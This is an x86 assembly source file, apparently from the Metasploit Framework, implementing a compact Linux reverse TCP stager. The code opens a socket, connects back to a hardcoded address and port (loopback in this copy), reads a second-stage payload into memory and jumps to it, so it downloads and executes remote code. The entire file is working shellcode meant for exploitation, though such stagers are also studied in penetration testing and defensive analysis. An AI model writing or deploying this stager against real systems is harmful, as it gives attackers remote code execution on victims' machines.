;;
; 
;        Name: stager_sock_reverse
;        Size: 50 bytes
;   Qualities: Can Have Nulls
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux reverse TCP stager.
;
;;
BITS 32

entry:
	xor  ebx, ebx

socket:
	push ebx
	inc  ebx
	push ebx
	push byte 0x2
	push byte 0x66
	pop  eax
	mov  ecx, esp
	int  0x80
	xchg eax, edx

connect:
	pop  ebx
	push dword 0x0100007f
	push word 0xbfbf
	push bx
	mov  ecx, esp
	push byte 0x66
	pop  eax
	push eax
	push ecx
	push edx
	mov  ecx, esp
	inc  ebx
	int  0x80

recv:
	pop  ebx
	cdq
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	jmp  ecx
